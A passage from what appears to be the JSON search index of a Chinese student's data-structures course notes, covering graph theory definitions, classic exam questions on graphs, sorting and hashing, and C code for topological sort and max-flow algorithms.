\u4e00\u4e2a\u5305\u542b4,5,6\u7684\u4e8c\u53c9\u641c\u7d22\u6811\uff0c\u5982\u679c4\u548c6\u5728\u540c\u4e00\u5c42\u4e0a\uff0c\u90a3\u4e485\u4e00\u5b9a\u662f\u5b83\u4eec\u7684Parent</li> </ul>"},{"location":"Courses/DS/FDS/%E4%B8%80%E4%BA%9B%E7%BB%8F%E5%85%B8%E9%A2%98%E7%9B%AE/#5","title":"5. \u56fe","text":"<ul> <li>\u4e00\u4e2aweakly connected\u7684digraph\uff0c\u8fb9\u6570\u6700\u5c11\u7684\u60c5\u51b5\u662f\u6811\u7684\u5f62\u5f0f<ul> <li></li> <li>\u6700\u5c11|V|-1 \u91c7\u7528\u6811\u7684\u5f62\u5f0f</li> </ul> </li> <li>degree\u548c\u4e3a\u8fb9\u6570\u7684\u4e24\u500d<ul> <li></li> <li>\\(\\sum (degree)=2e\\), \u5f97\u5230 \\(32=12+12+d(v-7)\\), \u7531\u4e8e \\(d&lt;3\\),\u6545 \\(8\\le 2(v-7)\u3002\\)</li> </ul> </li> <li>\u8981\u4fdd\u8bc1\u542b\u670910\u4e2a\u9876\u70b9\u7684\u65e0\u5411\u56fe\u8fde\u901a\uff0c\u6240\u9700\u8981\u7684\u6700\u5c11\u8fb9\u6570\u662f\uff1a<ul> <li>37\u4e2a \uff0c\u5148\u8ba9n-1\u4e2a\u9876\u70b9\u6784\u6210\u5b8c\u5168\u5b50\u56fe\uff0c\u518d\u628a\u7b2cn\u4e2a\u9876\u70b9\u4e0e\u8fd9\u4e2a\u5b50\u56fe\u76f8\u8fde\uff0c\u4e00\u5171\u9700\u8981 (n-1)(n-2)/2+1</li> </ul> </li> <li>sad<ul> <li></li> <li>\u6bcf\u4e2aEdge\u7684\u6743\u503c+2\uff0c\u5219\u8def\u5f84\u7684\u6743\u503c\u7b49\u4e8e\u539f\u6765\u7684\u503c\u52a0\u4e0a\u8fb9\u7684\u4e2a\u6570*2\uff0c\u5982\u679cP\u7684\u8fb9\u6570\u5f88\u591a\uff0c\u5c31\u6709\u53ef\u80fd\u4e0d\u518d\u662f\u6700\u77ed\u8def\u5f84\u3002</li> </ul> </li> <li>\u6b27\u62c9\u56fe<ul> <li></li> <li>20\u4e2a\u70b9\u7684\u5b8c\u5168\u56fe\uff0c\u6bcf\u4e2avertex\u7684\u5ea6\u4e3a19\u3002\u6b27\u62c9\u56fe\u7684\u6bcf\u4e2a\u70b9\u7684\u5ea6\u5fc5\u987b\u662f\u4e00\u4e2a\u5076\u6570\uff0c\u56e0\u6b64\u53ef\u4ee5\u4f7f\u5f97\u6bcf\u4e2a\u70b9\u7684\u5ea6\u6570\u4e3a18\uff0c\u4e00\u6761\u8fb9\u5bf9\u5e94\u4e24\u5ea6\uff0c\u51cf\u5c11\u7684\u8fb9\u4e3a\uff1a20/2 = 10</li> </ul> </li> </ul> <p>\u76f8\u5173\u5b9a\u7406</p> <ul> <li>\u65e0\u5411\u8fde\u901a\u56fe G \u662f \u6b27\u62c9\u56fe \uff0c\u5f53\u4e14\u4ec5\u5f53 G \u4e0d\u542b\u5947\u6570\u5ea6\u7ed3\u70b9( G \u7684\u6240\u6709\u7ed3\u70b9\u5ea6\u6570\u4e3a\u5076\u6570)\uff1b</li> <li>\u65e0\u5411\u8fde\u901a\u56fe G \u542b\u6709 \u6b27\u62c9\u901a\u8def \uff0c\u5f53\u4e14\u4ec5\u5f53 G \u6709\u96f6\u4e2a\u6216\u4e24\u4e2a\u5947\u6570\u5ea6\u7684\u7ed3\u70b9(\u8fd9\u4e24\u4e2a\u70b9\u4e3a\u8d77\u70b9\u548c\u7ec8\u70b9)\uff1b</li> <li>\u6709\u5411\u8fde\u901a\u56fe D \u662f \u6b27\u62c9\u56fe \uff0c\u5f53\u4e14\u4ec5\u5f53\u8be5\u56fe\u4e3a\u8fde\u901a\u56fe\u4e14 D \u4e2d\u6bcf\u4e2a\u7ed3\u70b9\u7684\u5165\u5ea6=\u51fa\u5ea6\uff1b</li> <li>\u6709\u5411\u8fde\u901a\u56fe D \u542b\u6709 \u6b27\u62c9\u901a\u8def \uff0c\u5f53\u4e14\u4ec5\u5f53\u8be5\u56fe\u4e3a\u8fde\u901a\u56fe\u4e14 D \u4e2d\u9664\u4e24\u4e2a\u7ed3\u70b9\u5916\uff0c\u5176\u4f59\u6bcf\u4e2a\u7ed3\u70b9\u7684\u5165\u5ea6=\u51fa\u5ea6\uff0c\u4e14\u6b64\u4e24\u70b9\u6ee1\u8db3\u8d77\u59cb\u70b9s\u7684\u5165\u5ea6=\u51fa\u5ea6-1\uff0c\u7ed3\u675f\u70b9t\u7684\u51fa\u5ea6=\u5165\u5ea6-1 \u6216\u4e24\u4e2a\u70b9\u7684\u5165\u5ea6=\u51fa\u5ea6\uff1b</li> </ul> \u5982\u679c\u56fe\u6ca1\u6709\u8054\u901a\u7684\u8bdd\uff0c\u6700\u5c0f\u751f\u6210\u6811\u4e0d\u5b58\u5728 <p>The minimum spanning tree of any weighted graph ___</p> <ul> <li>A. must be unique</li> <li>B. must not be unique</li> <li>C. exists but may not be unique</li> <li>D. may not exist</li> </ul> <p>\u7b54\u6848\u9009 D</p> <ul> <li>\u62d3\u6251\u5e8f\u6700\u65e9\u6700\u665a\u5b8c\u6210\u65f6\u95f4 \u7b54\u6848\u9009 C<ul> <li></li> <li></li> <li>\u5982\u679c\u6ca1\u6709 4-&gt;5 \u8fd9\u6761\u8fb9\uff0c\u90a3\u4e48\u8282\u70b94\u7684\u6700\u665a\u5b8c\u6210\u65f6\u95f4\u5e94\u4e3a 19-3=16</li> </ul> </li> <li>(False) \u56fe\u7684\u6df1\u5ea6\u4f18\u5148\u904d\u5386\u975e\u9012\u5f52\u7b97\u6cd5\u901a\u5e38\u91c7\u7528\u961f\u5217\u5b9e\u73b0\uff0c\u5e7f\u5ea6\u4f18\u5148\u904d\u5386\u975e\u9012\u5f52\u7b97\u6cd5\u901a\u5e38\u91c7\u7528\u5806\u6808\u5b9e\u73b0\u3002<ul> <li>\u56fe\u7684\u6df1\u5ea6\u4f18\u5148\u904d\u5386\u91c7\u7528\u5806\u6808\uff0c\u5e7f\u5ea6\u4f18\u5148\u904d\u5386\u91c7\u7528\u961f\u5217</li> </ul> </li> <li>If DFS from any vertex can visit every other vertices, then the topological order must not exist\u3002 \u4e00\u5b9a\u6709\u73af\u5b58\u5728\u3002<ul> <li>\u6362\u53e5\u8bdd\u8bf4\uff0c\u82e5\u56feG\u4e3a\u8fde\u901a\u56fe\u4e14\u4e0d\u5b58\u5728\u62d3\u6251\u6392\u5e8f\u5e8f\u5217\uff0c\u5219\u56feG\u5fc5\u6709\u73af\u3002</li> </ul> </li> <li>(False) If a graph is represented by adjacency lists, then the space taken depends only on the number of vertices, not the number of edges.<ul> <li>\u90bb\u63a5\u8868 \u548c \u90bb\u63a5\u77e9\u9635 \u662f\u4e0d\u4e00\u6837\u7684\uff0c\u90bb\u63a5\u8868\u91c7\u7528\u94fe\u8868\u6570\u7ec4\u7684\u5f62\u5f0f\u8868\u793a\u56fe</li> </ul> </li> </ul>"},{"location":"Courses/DS/FDS/%E4%B8%80%E4%BA%9B%E7%BB%8F%E5%85%B8%E9%A2%98%E7%9B%AE/#6","title":"6. \u6392\u5e8f","text":"<ul> <li>simple insertion sort \u4ea4\u6362\u7684\u6b21\u6570\u4e0d\u4f1a\u8d85\u8fc7\u9006\u5e8f\u5bf9\u7684\u4e2a\u6570<ul> <li></li> <li>10\u4e2a\u5143\u7d20\u9006\u5e8f\u7684\u8bdd\uff1a\u6709C(10,2)=45\u7684\u9006\u5e8f\u5bf9\uff0c\u56e0\u6b64\u4ea4\u6362\u7684\u6570\u76ee\u4e0d\u4f1a\u5927\u4e8e45</li> </ul> </li> <li>\u4e00\u8d9f\u540e\u80fd\u786e\u5b9a\u4e00\u4e2a\u6700\u7ec8\u4f4d\u7f6e\u7684\u6392\u5e8f<ul> <li></li> <li>\u4e00\u8d9f\u540e\u80fd\u786e\u5b9a\u8d77\u7801\u4e00\u4e2a\u5143\u7d20\u6700\u7ec8\u4f4d\u7f6e\u7684\u6392\u5e8f\uff1a\u5806\u6392\u5e8f\uff0c\u5192\u6ce1\u6392\u5e8f\uff0c\u5feb\u901f\u6392\u5e8f\uff0c\u7b80\u5355\u9009\u62e9\u6392\u5e8f</li> <li></li> </ul> </li> <li>\u5728\u9006\u5e8f\u5bf9\u76f8\u5f53\u5c11\u7684\u60c5\u51b5\u4e0b\uff0c\u9009\u62e9\u4e0b\u5217\u54ea\u4e2a\u6392\u5e8f\u6700\u4f18\uff1f Quick Sort\uff1bBubble Sort\uff1bMerge Sort\uff1bInsertion Sort\u3002<ul> <li>\u9009\u62e9\u63d2\u5165\u6392\u5e8f\uff0c\u5047\u8bbe\u8be5\u5e8f\u5217\u5df2\u7ecf\u9012\u589e\u6392\u5b8c\u5e8f\uff0c\u9006\u5e8f\u5bf9\u4e3a0\uff0c\u63d2\u5165\u6392\u5e8f\u6bcf\u8f6e\u5728\u6709\u5e8f\u533a\u4ece\u540e\u5f80\u524d\u6bd4\u8f83\uff0c\u7531\u4e8e\u65e0\u5e8f\u533a\u7b2c\u4e00\u4e2a\u5143\u7d20\u6bd4\u6709\u5e8f\u533a\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u8981\u5927\uff0c\u76f4\u63a5\u628a\u8be5\u5143\u7d20\u63d2\u5165\u6709\u5e8f\u533a\uff0c\u4e0d\u9700\u8981\u518d\u8ddf\u524d\u9762\u5143\u7d20\u6bd4\u8f83\uff0c\u4e5f\u4e0d\u9700\u8981\u4ea4\u6362\u5373\u53ef\u5b8c\u6210\u4e00\u8f6e\u6392\u5e8f\uff0c\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a \\(O(N)\\)</li> </ul> </li> <li>\u5982\u4f55\u627e\u5230QuickSort\u5408\u9002\u7684\u4e2d\u95f4\u8fc7\u7a0b<ul> <li></li> <li>\u627e\u5230\u7ed9\u5b9a\u5e8f\u5217\u4e2d\uff0c\u524d\u9762\u5143\u7d20\u90fd\u5c0f\u4e8e\u5b83\u4e14\u540e\u9762\u5143\u7d20\u90fd\u5927\u4e8e\u5b83\u7684\u5143\u7d20\uff0c\u5b83\u53ef\u4ee5\u662f\u4e00\u6b21Run\u4e2d\u9009\u5b9a\u7684Pivot</li> <li>\u7b2c\u4e00\u6b21Run\u9009\u5b9a\u4e00\u4e2aPivot\uff0c\u5982\u679c\u8fd9\u4e2aPivot\u5728\u7b2c\u4e00\u6b21Run\u540e\u88ab\u6362\u5230\u4e86\u7b2c\u4e00\u4e2a\u6216\u662f\u6700\u540e\u4e00\u4e2a\u4f4d\u7f6e\uff0c\u90a3\u4e48\u7b2c\u4e8c\u6b21Run\u53ea\u4f1a\u627e\u5230\u4e00\u4e2aPivot\uff1b\u5426\u5219\u7b2c\u4e8c\u6b21\u6709\u4e24\u4e2aPivot</li> </ul> </li> <li>LSD\u57fa\u6570\u6392\u5e8f\u505a\u9898<ul> <li></li> <li>\u7b2c\u4e00\u8f6e\u53ea\u770b\u4e2a\u4f4d\u6570\uff0c\u7b2c\u4e8c\u8f6e\u6309\u7167\u6700\u540e\u4e24\u4f4d\u6570\u5bf9\u5e94\u7684\u5927\u5c0f\u6392\u5217</li> </ul> </li> </ul>"},{"location":"Courses/DS/FDS/%E4%B8%80%E4%BA%9B%E7%BB%8F%E5%85%B8%E9%A2%98%E7%9B%AE/#7","title":"7. \u54c8\u5e0c\u8868","text":"<ul> <li><ul> <li>\u63d2\u5165\u63a2\u9488\u6570\u7684\u671f\u671b\u503c\u4f18\u4e8e\u7ebf\u6027\u5bfb\u5740\u63a2\u9488\u6570</li> <li>\u5728table size\u662f\u8d28\u6570\uff0c\u4e14\u81f3\u5c11\u6709\u4e00\u534a\u7a7a\u4f4d\u7684\u60c5\u51b5\u4e0b\uff0c\u4e00\u4e2a\u65b0\u5143\u7d20\u4e00\u5b9a\u53ef\u4ee5\u901a\u8fc7quadratic probing(\u4e8c\u6b21\u63a2\u6d4b)\u63d2\u5165</li> <li>\u5728Separate Chaining\u4e2d\uff0c\u5982\u679c\u5141\u8bb8\u5217\u8868\u4e2d\u51fa\u73b0\u91cd\u590d\u7684\u5143\u7d20\uff0c\u63d2\u5165\u901a\u5e38\u4f18\u4e8e\u5220\u9664(?\u770b\u4e0d\u61c2)</li> </ul> </li> <li><ul> <li>\u518d\u6563\u5217\u5c06TableSize\u6269\u5927\u4e24\u500d\u4e3a20\uff0c\u518d\u53d6\u6700\u8fd1\u7684\u7684\u8d28\u657023\u4f5c\u4e3a\u8868\u957f</li> </ul> </li> <li>\u53cc\u91cd\u54c8\u5e0c\uff0c\u5982\u679c\u7b2c\u4e00\u4e2a\u54c8\u5e0c\u51fd\u6570\u63a2\u6d4b\u5230\u7684\u4f4d\u7f6e\u5df2\u7ecf\u88ab\u5360\u7528\uff0c\u5219\u4f7f\u7528\u7b2c\u4e8c\u4e2a\u54c8\u5e0c\u51fd\u6570\u5f97\u5230\u4e00\u4e2a\u95f4\u9694\u503c\uff0c\u4e0e\u7b2c\u4e00\u4e2a\u51fd\u6570\u7ed3\u679c\u76f8\u52a0<ul> <li></li> </ul> </li> <li>\u6539\u53d8\u51b2\u7a81\u89e3\u51b3\u7b56\u7565\u5bf9\u4e8eRehashing\u6765\u8bf4\u4e0d\u5fc5\u8981<ul> <li></li> </ul> </li> <li>\u5bf9\u5305\u542bN\u4e2a\u5143\u7d20\u7684\u54c8\u5e0c\u8868\u8fdb\u884c\u67e5\u627e\uff0c\u5e73\u5747\u67e5\u627e\u957f\u5ea6\u4e3a\uff1a<ul> <li>\u4e0d\u786e\u5b9a\uff0c\u56e0\u4e3a\u4e0d\u6e05\u695a\u662f\u5426\u4f1a\u53d1\u751f\u51b2\u7a81</li> </ul> </li> </ul>"},{"location":"Courses/DS/FDS/%E5%9B%BE/","title":"\u56fe","text":""},{"location":"Courses/DS/FDS/%E5%9B%BE/#_1","title":"\u56fe","text":"<p> \u7ea6 2075 \u4e2a\u5b57  208 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 13 \u5206\u949f</p>"},{"location":"Courses/DS/FDS/%E5%9B%BE/#graph","title":"Graph \u56fe","text":"<pre><code>graph = (int **)malloc(N * sizeof(int *));\nfor(int i = 0; i &lt; N ; i++){\n\u00a0 \u00a0 graph[i] = (int *)malloc(N * sizeof(int));\n}//\u4e8c\u7ef4\u6570\u7ec4\u52a8\u6001\u5206\u914d\u5185\u5b58\uff0c\u53ef\u4ee5\u7528\u6765\u8868\u793a\u56fe\n</code></pre>"},{"location":"Courses/DS/FDS/%E5%9B%BE/#definition","title":"Definition","text":"<ul> <li>G(V,E)  : G\u4ee3\u8868\u56fe\uff0cV\u4ee3\u8868finite nonempty set of vertices(vertex\u7684\u590d\u6570\uff0c\u9876\u70b9)\uff0cE\u4ee3\u8868finite set of edges</li> <li>Undirected Graph : \\((v_i,v_j)=(v_j,v_i)\\)</li> <li>Directed Graph(digraph) : \\(&lt;v_i,v_j&gt;\\ne &lt;v_j,v_i&gt;\\)</li> <li>Restriction : (1) Self loop is not illegal;    (2) Multigraph is not considered.</li> <li>Complete Graph : \u8fb9\u6570\u6700\u5927\u7684graph <ul> <li>\u5bf9\u4e8e\u65e0\u5411\u56fe\uff0c\u82e5V=n\uff0c\u5219\\(E_{MAX}= C_n^2\\)\uff1b        </li> <li>\u5bf9\u4e8e\u6709\u5411\u56fe\uff0c\u82e5V=n\uff0c\u5219\\(E_{MAX} = 2*C_n^2 = P_n^2\\)</li> </ul> </li> <li>adjacent : \u76f8\u90bb\u7684<ul> <li></li> </ul> </li> <li>Subgraph : \\(G'\\subset G\\) if and only if \\(V(G')\\subset V(G)\\ \\&amp;\\&amp; \\ E(G')\\subset E(G)\\)</li> <li>Path from \\(v_q\\ to\\ v_p\\) : \\(\\{v_p, v_{i1}, v_{i2},..., v_{in}, v_q\\}\\) such that \\((v_p, v_{i1}),(v_{i1}, v_{i2}),\\)...\\(, (v_{in}, v_q)\\) or \\(&lt;v_p, v_{i1}&gt;,&lt;v_{i1}, v_{i2}&gt;,\\)...\\(, &lt;v_{in}, v_q&gt;\\) belong to \\(E(G)\\)</li> <li>Length of Path : path\u4e2d\u8fb9\u7684\u4e2a\u6570(\u6ce8\u610f\uff0c\u662f\u8fb9)</li> <li>Simple Path : \u8def\u5f84\u6ca1\u6709\u91cd\u590d\u7684\u70b9(\u4e0d\u5305\u62ec\u9996\u5c3e)</li> <li>Circle : \u9996\u5c3e\u76f8\u540c\u7684path</li> <li>(Connected) Component of an undirected G : \u6700\u5927\u7684connected subgraph</li> <li>A tree : a graph that is connected and acyclic \u8fde\u901a\u65e0\u73af</li> <li>A DAG : a directed acyclic graph \u6709\u5411\u65e0\u73af\u56fe</li> <li>Strongly Connected : \u5bf9\u4e8e\u6bcf\u4e00\u5bf9\\(v_i\\ v_j\\)\uff0c\u90fd\u5206\u522b\u5b58\u5728\u4ece\\(v_i\\ to\\ v_j\\ \u4ee5\u53ca\\ v_j\\ to\\ v_i\\)\u7684directed path</li> <li>Weakly Connected : \u4e0e\u4e0a\u9762\u76f8\u540c\uff0c\u4f46\u662f\u662f\u65e0\u65b9\u5411\u56fe\u4e2d\uff08\u76f4\u63a5\u5c06\u6709\u65b9\u5411\u56fe\u770b\u4f5c\u65e0\u65b9\u5411\u56fe\uff09</li> <li>Degree(v) : \u4e0ev\u76f8\u8fde\u7684\u8fb9\u7684\u4e2a\u6570\uff1b\u5982\u679c\u662f\u6709\u65b9\u5411\u56fe\uff0c\u5219\u7528in-degree\u8868\u793a\u6307\u5411v\u7684\u8fb9\u7684\u4e2a\u6570\uff0cout-degree\u8868\u793a\u4ecev\u6307\u51fa\u7684\u8fb9\u7684\u4e2a\u6570\u3002<ul> <li>\u4e5f\u56e0\u6b64\u53ef\u4ee5\u5f97\u5230\u8fb9\u7684\u603b\u6570\u4e3adegree(v)\u7684\u548c\u7684\u4e00\u534a(\u4e00\u6761\u8fb9\u7531\u4e24\u4e2avertex\u5171\u6709)</li> </ul> </li> <li>topological order : \u62d3\u6251\u5e8f\uff0ca linear ordering of the vertices of a graph such that, for any two vertices, i, j, if i is a predecessor of j in the network then i precedes j in the linear ordering.</li> </ul>"},{"location":"Courses/DS/FDS/%E5%9B%BE/#aov-network-active-on-vertices","title":"AOV network (Active on vertices)","text":"<p>\u5728 Digraph \u4e2d\uff0c\u7528\u9876\u70b9\u8868\u793a\u6d3b\u52a8\uff0c\u7528\u6709\u5411\u8fb9 \\(&lt;v_{i}, v_{j}&gt;\\) \u8868\u793a\u6d3b\u52a8 i \u662f\u6d3b\u52a8 j \u7684\u5fc5\u987b\u6761\u4ef6\u3002\u8fd9\u79cd\u6709\u5411\u56fe\u79f0\u4e3a\u7528\u9876\u70b9\u8868\u793a\u6d3b\u52a8\u7684\u7f51\u7edc\uff0c\u5373 AOV network\u3002</p> <p>\u6839\u636e\u5b9a\u4e49\uff0c\u4e00\u4e2a\u53ef\u884c\u7684AOV network\u5fc5\u987b\u662f DAG (directed acyclic graph)</p> <p>\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u6211\u4eec\u5f15\u5165\u4e86\u62d3\u6251\u5e8f\u3002</p>"},{"location":"Courses/DS/FDS/%E5%9B%BE/#topsort","title":"TopSort","text":"<p>\u4f2a\u4ee3\u7801\u5982\u4e0b:</p> <pre><code>void Topsort( Graph G ){\u00a0\u00a0 \n    Queue\u00a0 Q = CreateQueue( NumVertex );\n\u00a0\u00a0\u00a0 MakeEmpty( Q );\n\u00a0\u00a0\u00a0 int\u00a0 Counter = 0;\n\u00a0\u00a0\u00a0 Vertex\u00a0 V, W;\n\n\u00a0\u00a0\u00a0 for ( each vertex V )\n    \u00a0   if ( Indegree[ V ] == 0 )\u00a0\u00a0 \n        \u00a0   Enqueue( V, Q );\n\n\u00a0\u00a0\u00a0 while ( !IsEmpty( Q ) ) {\n    \u00a0 V = Dequeue( Q );\n    \u00a0 TopNum[ V ] = ++ Counter; /* assign next */\n    \u00a0 for ( each W adjacent from V )\n    \u00a0 \u00a0\u00a0\u00a0 if ( \u2013\u2013Indegree[ W ] == 0 )\u00a0 \n        \u00a0 \u00a0\u00a0\u00a0 Enqueue( W, Q );\n\u00a0\u00a0\u00a0 }\u00a0 /* end-while */\n\n\u00a0\u00a0\u00a0 if ( Counter != NumVertex )\n    \u00a0 Error( \u201cGraph has a cycle\u201d );\n\n\u00a0\u00a0\u00a0 DisposeQueue( Q ); /* free memory */\n}\n</code></pre>"},{"location":"Courses/DS/FDS/%E5%9B%BE/#seq","title":"\u5224\u65ad\u5e8f\u5217Seq\u662f\u5426\u662f\u62d3\u6251\u5e8f","text":"<p>\u5728\u5b9e\u6218\u4e2d\u5c3d\u91cf\u7528\u6570\u7ec4\u8868\u793a\u5427\uff0c\u7528\u94fe\u8868\u5199\u7684\u70c2\u5b8c\u4e86\ud83d\ude02</p> <pre><code>bool IsTopSeq(LGraph Graph,Vertex Seq[]){\n    PtrToAdjVNode temp,pre;\n    for(int i=0;i&lt;Graph-&gt;Nv;i++){\n        temp=(Graph-&gt;G)[Seq[i]-1].FirstEdge;\n        while(temp!=NULL){\n            for(int j=0;j&lt;i;j++){\n                if((temp-&gt;AdjV+1)==Seq[j]){\n                    return false;\n                }\n            }\n            pre=temp;\n            temp=temp-&gt;Next;\n        }\n    }return true;\n}\n\n//BYD\u547d\u540d\u592a\u6df7\u4e71\u4e86\uff0c\u8bb0\u4e2a\u601d\u8def\u5c31\u884c\n\n/*\n*\u6bcf\u6b21\u5faa\u73af\u5c06\u4eceSeq[i]out\u7684edge\u5f52\u96f6\n*\u4fee\u6b63\uff1a\u4e0d\u7528\u5f52\u96f6\uff0c\u56e0\u4e3a\u4e4b\u540e\u5c31\u4e0d\u4f1a\u8c03\u7528Seq[i]\u5bf9\u5e94\u7684Vertex\u4e86\n*\u5e76\u4e14\u5f52\u96f6\u524d\u68c0\u6d4b\u4e00\u904d\u5b83\u6307\u5411\u7684\u5143\u7d20\u662f\u5426\u5728Seq[i]\u524d\u9762\uff0c\n*\u82e5\u5728\u8bf4\u660efalse\uff0c\u6700\u540e\u90fd\u6ca1false\u5c31true\n*/\n</code></pre> <pre><code>//HW\u4e2d\u7684\u5b9e\u73b0\ntypedef struct AdjVNode *PtrToAdjVNode; \nstruct AdjVNode{\n    Vertex AdjV;\n    PtrToAdjVNode Next;\n};\n\ntypedef struct Vnode{\n    PtrToAdjVNode FirstEdge;\n} AdjList[MaxVertexNum]; //AdjList[i]\u4e2d\u5b58\u7b2ci\u4e2avertex\u7684out edge\u94fe\u8868\n\ntypedef struct GNode *PtrToGNode;\nstruct GNode{  \n    int Nv;\n    int Ne;\n    AdjList G;\n};\ntypedef PtrToGNode LGraph;\n\nLGraph G=ReadG();\n</code></pre>"},{"location":"Courses/DS/FDS/%E5%9B%BE/#network-flow-problems","title":"Network Flow Problems \u7f51\u7edc\u6700\u5927\u6d41\u95ee\u9898","text":"<p>\u7ed9\u5b9a\u4e00\u4e2a\u5e26\u6743\u56fe\uff0c\u4ee5\u53ca\u5934 s \u548c\u5c3e t\uff0c\u6c42\u4ece s \u5230 t \u5171\u6709\u591a\u5c11 flow \u53ef\u4ee5\u8fdb\u5165</p> <p>\u3010\u89e3\u51b3\u65b9\u6cd5\u3011 \\(G_f\uff1a\u6d41\u91cf\u56fe\\ \\ G_r\uff1a\u4f59\u91cf\u56fe\\ \\ \uff0c\u521d\u59cb\u65f6G_f\u4e3a\u7a7a\uff0cG_r\u548cG\u76f8\u540c\\)</p> <ol> <li>\u9009\u62e9\u8def\u5f84\uff1a\u5728\u56fe\\(G_r\\)\u4e2d\u4efb\u610f\u9009\u62e9\u4e00\u6761\u6e90\u70b9\u5230\u76ee\u6807\u70b9\u7684\u8def\u5f84</li> <li>\u66f4\u65b0\\(G_f\\)\uff1a\u5728\\(G_f\\)\u4e2d\u6dfb\u52a0\u8be5\u8def\u5f84\uff0c\u8def\u5f84\u7684\u5927\u5c0f\u7531\u6700\u5c0f\u6d41\u91cf\u51b3\u5b9a</li> <li>\u66f4\u65b0\\(G_r\\)\uff1a\u5982\u679c\u8def\u5f84\u7684\u4e00\u90e8\u5206\u4e3a \\(a-&gt;b\\) \u6574\u6761\u8def\u5f84\u6700\u5c0f\u6d41\u91cf\u4e3aq\uff0c\\(a-&gt;b\\)\u7684\u672c\u8eab\u6d41\u91cf\u4e3ap\uff0c\u5219\\(G_r\\)\u4e2d\u6dfb\u52a0\\(b-&gt;a\\)\uff0c\u6d41\u91cf\u4e3aq\uff0c\\(a-&gt;b\\)\u7684\u6d41\u91cf\u66f4\u65b0\u4e3ap-q(\u5982\u679c\u4e3a0\u5219\u5220\u53bb\u8fd9\u6761\u8def\u5f84)</li> <li>\u91cd\u590d1\u30012\u30013\u76f4\u5230\\(G_r\\)\u4e2d\u627e\u4e0d\u5230\u8def\u5f84</li> </ol>"},{"location":"Courses/DS/FDS/%E5%9B%BE/#dfs-depth-first-search","title":"dfs\u7b97\u6cd5\u5b9e\u73b0 Depth-First Search","text":"<pre><code>int n, m, s, t; // s\u662f\u6e90\u70b9\uff0ct\u662f\u6c47\u70b9\nbool vis[MAXN];\nint dfs(int p = s, int flow = INF){\n    if (p == t)\n        return flow; // \u5230\u8fbe\u7ec8\u70b9\uff0c\u8fd4\u56de\u8fd9\u6761\u589e\u5e7f\u8def\u7684\u6d41\u91cf\n    vis[p] = true;\n    for (int eg = head[p]; eg; eg = edges[eg].next){\n        int to = edges[eg].to, vol = edges[eg].w, c;\n        // \u8fd4\u56de\u7684\u6761\u4ef6\u662f\u6b8b\u4f59\u5bb9\u91cf\u5927\u4e8e0\u3001\u672a\u8bbf\u95ee\u8fc7\u8be5\u70b9\u4e14\u63a5\u4e0b\u6765\u53ef\u4ee5\u8fbe\u5230\u7ec8\u70b9\uff08\u9012\u5f52\u5730\u5b9e\u73b0\uff09\n        // \u4f20\u9012\u4e0b\u53bb\u7684\u6d41\u91cf\u662f\u8fb9\u7684\u5bb9\u91cf\u4e0e\u5f53\u524d\u6d41\u91cf\u4e2d\u7684\u8f83\u5c0f\u503c\n        if (vol &gt; 0 &amp;&amp; !vis[to] &amp;&amp; (c = dfs(to, min(vol, flow))) != -1){\n            edges[eg].w -= c;\n            edges[eg ^ 1].w += c;\n            // \u8fd9\u662f\u94fe\u5f0f\u524d\u5411\u661f\u53d6\u53cd\u5411\u8fb9\u7684\u4e00\u79cd\u7b80\u6613\u7684\u65b9\u6cd5\n            // \u5efa\u56fe\u65f6\u8981\u628acnt\u7f6e\u4e3a1\uff0c\u4e14\u8981\u4fdd\u8bc1\u53cd\u5411\u8fb9\u7d27\u63a5\u7740\u6b63\u5411\u8fb9\u5efa\u7acb\n            return c;\n        }\n    }\n    return -1; // \u65e0\u6cd5\u5230\u8fbe\u7ec8\u70b9\n}\ninline int FF()\n{\n    int ans = 0, c;\n    while ((c = dfs()) != -1)\n    {\n        memset(vis, 0, sizeof(vis));\n        ans += c;\n    }\n    return ans;\n}\n</code></pre>"},{"location":"Courses/DS/FDS/%E5%9B%BE/#bfs","title":"bfs\u7b97\u6cd5\u5b9e\u73b0","text":"<pre><code>int n, m, s, t, last[MAXN], flow[MAXN];\ninline int bfs()\n{\n    memset(last, -1, sizeof(last));\n    queue&lt;int&gt; q;\n    q.push(s);\n    flow[s] = INF;\n    while (!q.empty())\n    {\n        int p = q.front();\n        q.pop();\n        if (p == t) // \u5230\u8fbe\u6c47\u70b9\uff0c\u7ed3\u675f\u641c\u7d22\n            break;\n        for (int eg = head[p]; eg; eg = edges[eg].next)\n        {\n            int to = edges[eg].to, vol = edges[eg].w;\n            if (vol &gt; 0 &amp;&amp; last[to] == -1) // \u5982\u679c\u6b8b\u4f59\u5bb9\u91cf\u5927\u4e8e0\u4e14\u672a\u8bbf\u95ee\u8fc7\uff08\u6240\u4ee5last\u4fdd\u6301\u5728-1\uff09\n            {\n                last[to] = eg;\n                flow[to] = min(flow[p], vol);\n                q.push(to);\n            }\n        }\n    }\n    return last[t] != -1;\n}\ninline int EK()\n{\n    int maxflow = 0;\n    while (bfs())\n    {\n        maxflow += flow[t];\n        for (int i = t; i != s; i = edges[last[i] ^ 1].to) \n        // \u4ece\u6c47\u70b9\u539f\u8def\u8fd4\u56de\u66f4\u65b0\u6b8b\u4f59\u5bb9\u91cf\n        {\n            edges[last[i]].w -= flow[t];\n            edges[last[i] ^ 1].w += flow[t];\n        }\n    }\n    return maxflow;\n}\n</code></pre>"},{"location":"Courses/DS/FDS/%E5%9B%BE/#minimum-spanning-tree","title":"Minimum Spanning Tree \u6700\u5c0f\u751f\u6210\u6811","text":"<p>\u3010\u5b9a\u4e49\u3011 \u4e00\u4e2a\u8fde\u901a\u56fe\u7684\u751f\u6210\u6811\u662f\u4e00\u4e2a\u6781\u5c0f\u7684\u8fde\u901a\u5b50\u56fe\uff0c\u5b83\u5305\u542b\u56fe\u4e2d\u6240\u6709n\u4e2a\u9876\u70b9\uff0c\u4f46\u53ea\u6709\u6784\u6210\u4e00\u68f5\u6811\u7684n-1\u6761\u8fb9\u3002</p> <p>\u6240\u8c13\u4e00\u4e2a\u5e26\u6743\u56fe\u7684\u6700\u5c0f\u751f\u6210\u6811\uff0c\u5c31\u662f\u56fe\u4e2d\u8fb9\u7684\u6743\u503c\u548c\u6700\u5c0f\u7684\u751f\u6210\u6811\u3002</p> <p>\u3010\u5c5e\u6027\u3011</p> <ul> 